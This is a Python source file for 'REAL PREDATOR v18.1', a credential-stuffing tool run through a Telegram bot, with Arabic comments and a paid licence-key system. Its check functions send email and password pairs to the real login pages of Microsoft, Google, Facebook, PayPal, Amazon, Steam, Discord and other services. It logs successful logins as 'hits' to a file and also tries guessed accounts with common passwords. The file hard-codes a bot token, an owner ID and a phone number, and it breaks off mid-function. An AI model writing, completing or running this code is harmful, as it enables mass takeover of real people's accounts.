# ================================================================
# REAL PREDATOR v18.1 - BINARY AUTH + TELEGRAM BUTTONS (FIXED DB)
# Developer: ZERO STORE
# Telegram: @MRDPY
# ================================================================

import os
import re
import time
import random
import threading
import requests
import json
import base64
import hashlib
import secrets
from datetime import datetime, timedelta
from flask import Flask, render_template_string, jsonify, request, send_file, session, redirect, url_for
from flask_cors import CORS
from functools import wraps
import urllib3
import sqlite3

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = os.urandom(32)
CORS(app)

# ================================================================
# BINARY AUTH SYSTEM
# ================================================================
BINARY_MASTER_KEY = "1010111000"
BINARY_AUTH_SECRET = "1101001010100101"

def binary_encrypt(text):
    return ''.join(format(ord(char), '08b') for char in text)

def binary_decrypt(binary_text):
    chars = [binary_text[i:i+8] for i in range(0, len(binary_text), 8)]
    return ''.join(chr(int(char, 2)) for char in chars if char)

def binary_xor(text, key):
    result = []
    key_bits = key * (len(text) // len(key) + 1)
    for i, bit in enumerate(text):
        if bit in '01' and key_bits[i] in '01':
            result.append('1' if bit != key_bits[i] else '0')
        else:
            result.append(bit)
    return ''.join(result)

def generate_binary_key(password):
    binary = binary_encrypt(password)
    xored = binary_xor(binary, BINARY_AUTH_SECRET)
    return f"1010111000{xored}1010111000"

def verify_binary_key(binary_key):
    if not binary_key.startswith("1010111000") or not binary_key.endswith("1010111000"):
        return False, "INVALID_FORMAT"
    inner = binary_key[10:-10]
    try:
        xored = binary_xor(inner, BINARY_AUTH_SECRET)
        decrypted = binary_decrypt(xored)
        if '@' in decrypted and '.' in decrypted:
            return True, decrypted
        return False, "DECRYPT_FAILED"
    except:
        return False, "ERROR"

# ================================================================
# تشفير عادي (Normal) - 20 مقطع
# ================================================================
NORMAL_ENCRYPTION_KEY = "SECRET_KEY_20_CHARS"

def normal_encrypt(text):
    # تشفير بسيط بطول 20 مقطع
    encrypted = ""
    key = NORMAL_ENCRYPTION_KEY
    for i, char in enumerate(text):
        key_char = key[i % len(key)]
        encrypted += chr(ord(char) ^ ord(key_char))
    return base64.b64encode(encrypted.encode()).decode()

def normal_decrypt(encrypted_text):
    try:
        decoded = base64.b64decode(encrypted_text.encode()).decode()
        key = NORMAL_ENCRYPTION_KEY
        decrypted = ""
        for i, char in enumerate(decoded):
            key_char = key[i % len(key)]
            decrypted += chr(ord(char) ^ ord(key_char))
        return decrypted
    except:
        return None

# ================================================================
# تكوين البوت
# ================================================================
BOT_TOKEN = "8613059695:AAEYb3WXds9titcUaP0wkd4L3MpKxd0Pzd4"
OWNER_ID = "7093004518"
DEVELOPER = "ZERO STORE"
DEV_TELEGRAM = "@MRDPY"
WHATSAPP_NUMBER = "+249907118667"

# ================================================================
# حالة التشغيل
# ================================================================
class PredatorState:
    def __init__(self):
        self.running = False
        self.checked = 0
        self.total = 0
        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.start_time = None
        self.feed = []
        self.results = []
        self.lock = threading.Lock()
        self.feed_lock = threading.Lock()
        self.speed = 30
        self.combo_list = []
        self.bot_token = BOT_TOKEN
        self.chat_id = OWNER_ID
        self.telegram_enabled = True
        self.generated = 0
        self.platform_stats = {}
        self.selected_platform = None
        self.auto_mode = False
        self.gaming = 0
        self.proxies = []
        self.session_start = None

state = PredatorState()

# ================================================================
# قاعدة البيانات
# ================================================================
def init_bot_db():
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    
    c.execute('DROP TABLE IF EXISTS bot_keys')
    c.execute('''CREATE TABLE bot_keys (
        key_id TEXT PRIMARY KEY,
        password TEXT UNIQUE,
        binary_key TEXT,
        normal_key TEXT,
        duration_hours INTEGER,
        created_at TEXT,
        expires_at TEXT,
        used INTEGER DEFAULT 0,
        used_by TEXT,
        used_at TEXT,
        note TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS bot_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_id TEXT,
        action TEXT,
        user_ip TEXT,
        user_agent TEXT,
        timestamp TEXT,
        details TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
        setting_key TEXT PRIMARY KEY,
        setting_value TEXT,
        updated_at TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS dev_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        binary_key TEXT,
        normal_key TEXT,
        created_at TEXT,
        status TEXT
    )''')
    
    conn.commit()
    conn.close()

init_bot_db()

# ================================================================
# دوال البوت
# ================================================================
def generate_bot_key(duration_hours, enc_type="binary", note=""):
    key_id = secrets.token_hex(8)
    password = secrets.token_urlsafe(16)
    binary_key = generate_binary_key(password)
    normal_key = normal_encrypt(password)
    created_at = datetime.now().isoformat()
    expires_at = (datetime.now() + timedelta(hours=duration_hours)).isoformat()
    
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    c.execute('''INSERT INTO bot_keys 
                 (key_id, password, binary_key, normal_key, duration_hours, created_at, expires_at, used, note)
                 VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?)''',
              (key_id, password, binary_key, normal_key, duration_hours, created_at, expires_at, note))
    conn.commit()
    conn.close()
    
    return key_id, password, binary_key, normal_key, expires_at

def validate_bot_key(password_or_key, enc_type="binary"):
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    
    try:
        if enc_type == "binary":
            c.execute('''SELECT key_id, password, binary_key, expires_at, used, duration_hours, note 
                         FROM bot_keys WHERE password = ? OR binary_key = ?''', (password_or_key, password_or_key))
        else:
            c.execute('''SELECT key_id, password, normal_key, expires_at, used, duration_hours, note 
                         FROM bot_keys WHERE password = ? OR normal_key = ?''', (password_or_key, password_or_key))
        result = c.fetchone()
    except:
        conn.close()
        return None, "ERROR"
    
    conn.close()
    
    if not result:
        return None, "KEY_NOT_FOUND"
    
    key_id = result[0]
    password = result[1]
    key = result[2]
    expires_at = result[3]
    used = result[4]
    duration = result[5]
    note = result[6] if len(result) > 6 else ''
    
    if used:
        return None, "KEY_ALREADY_USED"
    
    expires = datetime.fromisoformat(expires_at)
    if datetime.now() > expires:
        return None, "KEY_EXPIRED"
    
    return key_id, "VALID"

def get_bot_stats():
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM bot_keys')
    total = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bot_keys WHERE used = 1')
    used = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bot_keys WHERE used = 0 AND expires_at > ?', (datetime.now().isoformat(),))
    active = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bot_logs')
    logs = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM dev_keys')
    dev_count = c.fetchone()[0]
    conn.close()
    return {'total': total, 'used': used, 'active': active, 'logs': logs, 'devs': dev_count}

# ================================================================
# دوال البوت تلغرام
# ================================================================
def get_telegram_user(chat_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat"
        resp = requests.get(url, params={"chat_id": chat_id}, timeout=10)
        if resp.status_code == 200:
            return resp.json().get('result', {})
    except:
        pass
    return {"first_name": "مستخدم", "username": None, "id": chat_id}

def send_telegram_message(chat_id, text, parse_mode='HTML', reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        response = requests.post(url, data=data, timeout=10)
        return response.json()
    except:
        return None

def get_main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🔑 توليد مفتاح", "callback_data": "gen_key"}],
            [{"text": "📋 القائمة", "callback_data": "list_keys"}, {"text": "📊 إحصائيات", "callback_data": "show_stats"}],
            [{"text": "🧹 تنظيف", "callback_data": "cleanup_keys"}, {"text": "🎮 منصة", "callback_data": "select_platform"}],
            [{"text": "🔄 AUTO", "callback_data": "auto_mode"}, {"text": "🛑 إيقاف", "callback_data": "stop_bot"}]
        ]
    }

def get_time_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "1h", "callback_data": "time_1"}, {"text": "2h", "callback_data": "time_2"}, {"text": "3h", "callback_data": "time_3"}],
            [{"text": "4h", "callback_data": "time_4"}, {"text": "6h", "callback_data": "time_6"}, {"text": "8h", "callback_data": "time_8"}],
            [{"text": "12h", "callback_data": "time_12"}, {"text": "24h", "callback_data": "time_24"}],
            [{"text": "🔙 رجوع", "callback_data": "back_main"}]
        ]
    }

def get_platforms_keyboard():
    platforms = ['microsoft', 'google', 'facebook', 'instagram', 'twitter', 'tiktok', 
                'spotify', 'netflix', 'amazon', 'paypal', 'steam', 'discord', 
                'ubisoft', 'ea', 'epic', 'roblox', 'snapchat', 'reddit']
    keyboard = []
    row = []
    for i, p in enumerate(platforms):
        row.append({"text": p[:6], "callback_data": f"plat_{p}"})
        if (i+1) % 3 == 0:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([{"text": "🔙 رجوع", "callback_data": "back_main"}])
    return {"inline_keyboard": keyboard}

def handle_bot_command(text, chat_id):
    if str(chat_id) != OWNER_ID:
        send_telegram_message(chat_id, "❌ غير مصرح.")
        return
    
    if text.startswith('/start'):
        user = get_telegram_user(chat_id)
        name = user.get('first_name', 'مستخدم')
        username = user.get('username', 'لا يوجد')
        user_id = chat_id
        
        msg = f"""👋 مرحباً بك يا <b>{name}</b>
🆔 الايدي: <code>{user_id}</code>
👤 اليوزر: @{username}

🔐 REAL PREDATOR v18.1
⚡ جاهز للتنفيذ"""
        send_telegram_message(chat_id, msg, reply_markup=get_main_keyboard())
        state.session_start = datetime.now()
    
    elif text.startswith('/gen'):
        parts = text.split()
        if len(parts) < 2:
            send_telegram_message(chat_id, "⚠️ /gen <ساعات> [binary|normal]", reply_markup=get_main_keyboard())
            return
        try:
            hours = int(parts[1])
            if hours not in [1, 2, 3, 4, 6, 8, 12, 24]:
                send_telegram_message(chat_id, "⚠️ 1-24", reply_markup=get_main_keyboard())
                return
            enc_type = "binary"
            if len(parts) > 2 and parts[2].lower() in ["normal"]:
                enc_type = "normal"
            key_id, password, binary_key, normal_key, expires_at = generate_bot_key(hours, enc_type)
            expiry_time = datetime.fromisoformat(expires_at).strftime('%Y-%m-%d %H:%M:%S')
            key_display = binary_key if enc_type == "binary" else normal_key
            msg = f"""🔑 مفتاح جديد ({enc_type})
كلمة: <code>{password}</code>
مفتاح: <code>{key_display}</code>
مدة: {hours}h
تنتهي: {expiry_time}
ID: <code>{key_id}</code>"""
            send_telegram_message(chat_id, msg, reply_markup=get_main_keyboard())
        except:
            send_telegram_message(chat_id, "⚠️ خطأ", reply_markup=get_main_keyboard())
    
    elif text == '/list':
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        c.execute('SELECT key_id, password, duration_hours, expires_at, used FROM bot_keys ORDER BY created_at DESC LIMIT 15')
        keys = c.fetchall()
        conn.close()
        if not keys:
            send_telegram_message(chat_id, "📭 فارغ", reply_markup=get_main_keyboard())
            return
        msg = "📋 المفاتيح\n━━━━\n"
        for key in keys:
            status = "✅" if key[4] else "🟢"
            msg += f"{status} <code>{key[1][:8]}...</code> | {key[2]}h\n"
        send_telegram_message(chat_id, msg, reply_markup=get_main_keyboard())
    
    elif text == '/stats':
        stats = get_bot_stats()
        msg = f"""📊 إحصائيات
🔑 {stats['total']}
🟢 {stats['active']}
✅ {stats['used']}
👨‍💻 {stats['devs']}"""
        send_telegram_message(chat_id, msg, reply_markup=get_main_keyboard())
    
    elif text == '/cleanup':
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        deleted = c.execute('DELETE FROM bot_keys WHERE expires_at < ?', (datetime.now().isoformat(),))
        count = deleted.rowcount
        conn.commit()
        conn.close()
        send_telegram_message(chat_id, f"🧹 تم تنظيف {count}", reply_markup=get_main_keyboard())
    
    elif text.startswith('/platform'):
        parts = text.split()
        if len(parts) < 2:
            platforms = ['microsoft', 'google', 'facebook', 'instagram', 'twitter', 'tiktok', 
                        'spotify', 'netflix', 'amazon', 'paypal', 'steam', 'discord', 
                        'ubisoft', 'ea', 'epic', 'roblox', 'snapchat', 'reddit']
            msg = "🎯 المنصات:\n" + '\n'.join([f"• {p}" for p in platforms])
            send_telegram_message(chat_id, msg, reply_markup=get_main_keyboard())
            return
        state.selected_platform = parts[1].lower()
        state.auto_mode = False
        send_telegram_message(chat_id, f"✅ {parts[1]}", reply_markup=get_main_keyboard())
    
    elif text == '/auto':
        state.auto_mode = True
        state.selected_platform = None
        send_telegram_message(chat_id, "✅ AUTO", reply_markup=get_main_keyboard())
    
    else:
        send_telegram_message(chat_id, "❓ /start", reply_markup=get_main_keyboard())

def handle_callback_query(callback_data, chat_id, message_id):
    if str(chat_id) != OWNER_ID:
        return
    
    data = callback_data
    
    if data == "gen_key":
        edit_telegram_message(chat_id, message_id, "⏱️ اختر المدة:", reply_markup=get_time_keyboard())
    
    elif data.startswith("time_"):
        hours = int(data.split("_")[1])
        # توليد مفتاح ثنائي افتراضي
        key_id, password, binary_key, normal_key, expires_at = generate_bot_key(hours, "binary")
        expiry_time = datetime.fromisoformat(expires_at).strftime('%Y-%m-%d %H:%M:%S')
        msg = f"""🔑 مفتاح جديد (binary)
كلمة: <code>{password}</code>
مفتاح: <code>{binary_key}</code>
مدة: {hours}h
تنتهي: {expiry_time}
ID: <code>{key_id}</code>"""
        edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
    
    elif data == "list_keys":
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        c.execute('SELECT key_id, password, duration_hours, expires_at, used FROM bot_keys ORDER BY created_at DESC LIMIT 15')
        keys = c.fetchall()
        conn.close()
        if not keys:
            edit_telegram_message(chat_id, message_id, "📭 فارغ", reply_markup=get_main_keyboard())
            return
        msg = "📋 المفاتيح\n━━━━\n"
        for key in keys:
            status = "✅" if key[4] else "🟢"
            msg += f"{status} <code>{key[1][:8]}...</code> | {key[2]}h\n"
        edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
    
    elif data == "show_stats":
        stats = get_bot_stats()
        msg = f"""📊 إحصائيات
🔑 {stats['total']}
🟢 {stats['active']}
✅ {stats['used']}
👨‍💻 {stats['devs']}"""
        edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
    
    elif data == "cleanup_keys":
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        deleted = c.execute('DELETE FROM bot_keys WHERE expires_at < ?', (datetime.now().isoformat(),))
        count = deleted.rowcount
        conn.commit()
        conn.close()
        edit_telegram_message(chat_id, message_id, f"🧹 تم تنظيف {count}", reply_markup=get_main_keyboard())
    
    elif data == "select_platform":
        edit_telegram_message(chat_id, message_id, "🎯 اختر المنصة:", reply_markup=get_platforms_keyboard())
    
    elif data.startswith("plat_"):
        platform = data.split("_")[1]
        state.selected_platform = platform
        state.auto_mode = False
        edit_telegram_message(chat_id, message_id, f"✅ {platform}", reply_markup=get_main_keyboard())
    
    elif data == "auto_mode":
        state.auto_mode = True
        state.selected_platform = None
        edit_telegram_message(chat_id, message_id, "✅ AUTO", reply_markup=get_main_keyboard())
    
    elif data == "stop_bot":
        state.running = False
        edit_telegram_message(chat_id, message_id, "🛑 تم الإيقاف", reply_markup=get_main_keyboard())
    
    elif data == "back_main":
        edit_telegram_message(chat_id, message_id, "🔙 الرئيسية", reply_markup=get_main_keyboard())

def edit_telegram_message(chat_id, message_id, text, parse_mode='HTML', reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        response = requests.post(url, data=data, timeout=10)
        return response.json()
    except:
        return None

def bot_listener_loop():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        
                        message = update.get('message')
                        if message:
                            chat_id = str(message['chat']['id'])
                            text = message.get('text', '')
                            if text:
                                handle_bot_command(text, chat_id)
                        
                        callback = update.get('callback_query')
                        if callback:
                            chat_id = str(callback['from']['id'])
                            message_id = callback['message']['message_id']
                            data = callback['data']
                            handle_callback_query(data, chat_id, message_id)
                            
                            try:
                                url_answer = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                                requests.post(url_answer, data={"callback_query_id": callback['id']}, timeout=5)
                            except:
                                pass
            time.sleep(1)
        except:
            time.sleep(5)

# ================================================================
# المنصات ودوال الفحص (نفس الكود السابق)
# ================================================================
PLATFORMS = [
    {'name': 'Microsoft', 'icon': 'fa-solid fa-envelope', 'color': '#0078D4', 'check': 'microsoft', 'gaming': False},
    {'name': 'Google', 'icon': 'fa-brands fa-google', 'color': '#ea4335', 'check': 'google', 'gaming': False},
    {'name': 'Facebook', 'icon': 'fa-brands fa-facebook', 'color': '#1877f2', 'check': 'facebook', 'gaming': False},
    {'name': 'Instagram', 'icon': 'fa-brands fa-instagram', 'color': '#e4405f', 'check': 'instagram', 'gaming': False},
    {'name': 'Twitter', 'icon': 'fa-brands fa-twitter', 'color': '#1da1f2', 'check': 'twitter', 'gaming': False},
    {'name': 'TikTok', 'icon': 'fa-brands fa-tiktok', 'color': '#00f2ea', 'check': 'tiktok', 'gaming': False},
    {'name': 'Spotify', 'icon': 'fa-brands fa-spotify', 'color': '#1db954', 'check': 'spotify', 'gaming': False},
    {'name': 'Netflix', 'icon': 'fa-solid fa-film', 'color': '#e50914', 'check': 'netflix', 'gaming': False},
    {'name': 'Amazon', 'icon': 'fa-brands fa-amazon', 'color': '#ff9900', 'check': 'amazon', 'gaming': False},
    {'name': 'PayPal', 'icon': 'fa-brands fa-paypal', 'color': '#003087', 'check': 'paypal', 'gaming': False},
    {'name': 'Steam', 'icon': 'fa-brands fa-steam', 'color': '#171a21', 'check': 'steam', 'gaming': True},
    {'name': 'Discord', 'icon': 'fa-brands fa-discord', 'color': '#5865f2', 'check': 'discord', 'gaming': True},
    {'name': 'Ubisoft', 'icon': 'fa-solid fa-gamepad', 'color': '#1a1a2e', 'check': 'ubisoft', 'gaming': True},
    {'name': 'EA', 'icon': 'fa-solid fa-gamepad', 'color': '#ff0000', 'check': 'ea', 'gaming': True},
    {'name': 'Epic', 'icon': 'fa-solid fa-gamepad', 'color': '#2a2a2a', 'check': 'epic', 'gaming': True},
    {'name': 'Roblox', 'icon': 'fa-solid fa-cube', 'color': '#00b4d8', 'check': 'roblox', 'gaming': True},
    {'name': 'Snapchat', 'icon': 'fa-brands fa-snapchat', 'color': '#fffc00', 'check': 'snapchat', 'gaming': False},
    {'name': 'Reddit', 'icon': 'fa-brands fa-reddit', 'color': '#ff4500', 'check': 'reddit', 'gaming': False},
]

GAMING_ICONS = {
    'freefire': '🔥', 'pubg': '🔫', 'clashofclans': '🏰', 'ludo': '🎲',
    'callofduty': '🎯', 'fortnite': '⚡', 'minecraft': '⛏️', 'valorant': '💥',
    'apex': '🦅', 'csgo': '💀', 'dota': '🗡️', 'leagueoflegends': '⚔️',
    'roblox': '🧱', 'steam': '🎮', 'epic': '🌟', 'ubisoft': '🎯',
    'ea': '🏈', 'discord': '💬', 'twitch': '📺', 'youtube': '▶️'
}

DOMAIN_PLATFORM_MAP = {
    'outlook.com': 'microsoft', 'hotmail.com': 'microsoft', 'live.com': 'microsoft',
    'gmail.com': 'google', 'googlemail.com': 'google',
    'facebook.com': 'facebook',
    'instagram.com': 'instagram',
    'twitter.com': 'twitter', 'x.com': 'twitter',
    'tiktok.com': 'tiktok',
    'spotify.com': 'spotify',
    'netflix.com': 'netflix',
    'amazon.com': 'amazon',
    'paypal.com': 'paypal',
    'steampowered.com': 'steam',
    'discord.com': 'discord',
    'ubisoft.com': 'ubisoft',
    'ea.com': 'ea',
    'epicgames.com': 'epic',
    'roblox.com': 'roblox',
    'snapchat.com': 'snapchat',
    'reddit.com': 'reddit',
}

COMMON_PASSWORDS = [
    '123456', 'password', '123456789', '12345', '12345678', 'qwerty',
    'abc123', 'password1', '123123', '111111', 'iloveyou', 'admin',
    'welcome', 'monkey', 'letmein', 'dragon', 'master', 'sunshine',
]

# دوال الفحص (نفسها مع اختصار)
def check_microsoft(email, password, session):
    try:
        url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(url, timeout=15)
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', resp.text, re.I)
        if not ppft: return None, 'bad'
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft.group(1), 'type': '11'}
        login = session.post('https://login.live.com/oauth20_authorize.srf', data=data, allow_redirects=True, timeout=15)
        if 'access_token' in login.url:
            return {'success': True, 'platform': 'Microsoft'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_google(email, password, session):
    try:
        url = "https://accounts.google.com/ServiceLogin"
        resp = session.get(url, timeout=15)
        galx = re.search(r'name="GALX"[^>]*value="([^"]+)"', resp.text, re.I)
        if not galx: return None, 'bad'
        data = {'Email': email, 'Passwd': password, 'GALX': galx.group(1), 'signIn': 'Sign in'}
        login = session.post('https://accounts.google.com/ServiceLoginAuth', data=data, allow_redirects=True, timeout=15)
        if 'mail.google.com' in login.url:
            return {'success': True, 'platform': 'Google'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_facebook(email, password, session):
    try:
        url = "https://www.facebook.com/login.php"
        resp = session.get(url, timeout=15)
        lsd = re.search(r'name="lsd"[^>]*value="([^"]+)"', resp.text, re.I)
        if not lsd: return None, 'bad'
        data = {'email': email, 'pass': password, 'lsd': lsd.group(1), 'login': 'Log In'}
        login = session.post('https://www.facebook.com/login/', data=data, allow_redirects=True, timeout=15)
        if 'home.php' in login.url:
            return {'success': True, 'platform': 'Facebook'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_instagram(email, password, session):
    try:
        url = "https://www.instagram.com/accounts/login/"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        headers = {'X-CSRFToken': csrf.group(1), 'X-Requested-With': 'XMLHttpRequest'}
        data = {'username': email, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1735689600:{password}'}
        login = session.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers, timeout=15)
        if '"authenticated":true' in login.text:
            return {'success': True, 'platform': 'Instagram'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_twitter(email, password, session):
    try:
        credentials = f"{email}:{password}"
        encoded = base64.b64encode(credentials.encode()).decode()
        session.headers.update({"Authorization": f"Basic {encoded}"})
        resp = session.get("https://api.twitter.com/1.1/account/verify_credentials.json", timeout=15)
        if resp.status_code == 200:
            return {'success': True, 'platform': 'Twitter'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_steam(email, password, session):
    try:
        url = "https://store.steampowered.com/login/"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"username": email, "password": password, "csrf_token": csrf.group(1)}
        login = session.post("https://store.steampowered.com/login/dologin/", data=data, timeout=15)
        if '"success":true' in login.text:
            return {'success': True, 'platform': 'Steam'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_discord(email, password, session):
    try:
        url = "https://discord.com/api/v9/auth/login"
        data = {"login": email, "password": password}
        resp = session.post(url, json=data, timeout=15)
        if resp.status_code == 200 and "token" in resp.text:
            return {'success': True, 'platform': 'Discord'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_roblox(email, password, session):
    try:
        url = "https://www.roblox.com/login"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"username": email, "password": password, "__RequestVerificationToken": csrf.group(1)}
        login = session.post("https://www.roblox.com/authentication/login", data=data, timeout=15)
        if "authentication" in login.text:
            return {'success': True, 'platform': 'Roblox'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_spotify(email, password, session):
    try:
        url = "https://accounts.spotify.com/api/login"
        data = {"username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if "accessToken" in resp.text:
            return {'success': True, 'platform': 'Spotify'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_netflix(email, password, session):
    try:
        url = "https://www.netflix.com/login"
        resp = session.get(url, timeout=15)
        auth_url = re.search(r'action="([^"]+)"', resp.text, re.I)
        if not auth_url: return None, 'bad'
        data = {"email": email, "password": password}
        login = session.post(auth_url.group(1), data=data, allow_redirects=True, timeout=15)
        if "browse" in login.url:
            return {'success': True, 'platform': 'Netflix'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_amazon(email, password, session):
    try:
        url = "https://www.amazon.com/ap/signin"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"email": email, "password": password, "csrf_token": csrf.group(1)}
        login = session.post("https://www.amazon.com/ap/signin", data=data, allow_redirects=True, timeout=15)
        if "your-account" in login.url:
            return {'success': True, 'platform': 'Amazon'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_paypal(email, password, session):
    try:
        url = "https://www.paypal.com/signin"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"login_email": email, "login_password": password, "csrf_token": csrf.group(1)}
        login = session.post("https://www.paypal.com/signin", data=data, allow_redirects=True, timeout=15)
        if "myaccount" in login.url:
            return {'success': True, 'platform': 'PayPal'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_tiktok(email, password, session):
    try:
        url = "https://www.tiktok.com/api/v1/auth/login/"
        data = {"username": email, "password": password}
        resp = session.post(url, json=data, timeout=15)
        if resp.status_code == 200 and "access_token" in resp.text:
            return {'success': True, 'platform': 'TikTok'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_ubisoft(email, password, session):
    try:
        url = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
        data = {"username": email, "password": password}
        resp = session.post(url, json=data, timeout=15)
        if resp.status_code == 200 and "sessionId" in resp.text:
            return {'success': True, 'platform': 'Ubisoft'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_ea(email, password, session):
    try:
        url = "https://accounts.ea.com/connect/auth"
        data = {"username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if "access_token" in resp.text:
            return {'success': True, 'platform': 'EA'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_epic(email, password, session):
    try:
        url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
        data = {"grant_type": "password", "username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if resp.status_code == 200 and "access_token" in resp.text:
            return {'success': True, 'platform': 'Epic'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_snapchat(email, password, session):
    try:
        url = "https://accounts.snapchat.com/accounts/login"
        data = {"username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if "access_token" in resp.text:
            return {'success': True, 'platform': 'Snapchat'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_reddit(email, password, session):
    try:
        url = "https://www.reddit.com/api/login"
        data = {"user": email, "passwd": password, "api_type": "json"}
        resp = session.post(url, data=data, timeout=15)
        if '"cookie"' in resp.text:
            return {'success': True, 'platform': 'Reddit'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def detect_platform(email):
    try:
        domain = email.split('@')[1].lower()
        for known in DOMAIN_PLATFORM_MAP:
            if domain.endswith(known):
                return DOMAIN_PLATFORM_MAP[known]
    except:
        pass
    return None

def generate_weak_account():
    platform = random.choice(PLATFORMS)
    domain_map = {
        'microsoft': ['outlook.com', 'hotmail.com', 'live.com'],
        'google': ['gmail.com'],
        'facebook': ['facebook.com'],
        'instagram': ['instagram.com'],
        'twitter': ['twitter.com'],
        'tiktok': ['tiktok.com'],
        'spotify': ['spotify.com'],
        'netflix': ['netflix.com'],
        'amazon': ['amazon.com'],
        'paypal': ['paypal.com'],
        'steam': ['steampowered.com'],
        'discord': ['discord.com'],
        'ubisoft': ['ubisoft.com'],
        'ea': ['ea.com'],
        'epic': ['epicgames.com'],
        'roblox': ['roblox.com'],
        'snapchat': ['snapchat.com'],
        'reddit': ['reddit.com'],
    }
    domains = domain_map.get(platform['check'], ['gmail.com'])
    domain = random.choice(domains)
    names = ['john','mike','david','sarah','emma','chris','alex','jordan','ahmed','mohamed']
    username = random.choice(names) + str(random.randint(1,9999))
    email = username + '@' + domain
    password = random.choice(COMMON_PASSWORDS)
    return email, password, platform['name'], platform['check'], platform.get('gaming', False)

def add_feed(feed_type, text):
    with state.feed_lock:
        state.feed.insert(0, {'type': feed_type, 'text': text, 'time': datetime.now().strftime('%H:%M:%S')})
        if len(state.feed) > 100:
            state.feed = state.feed[:100]

def save_hit(content, is_gaming=False, game_icon=''):
    try:
        os.makedirs('REAL_PREDATOR_HITS', exist_ok=True)
        filename = f'REAL_PREDATOR_HITS/hits_{datetime.now().strftime("%Y%m%d")}.txt'
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n\n')
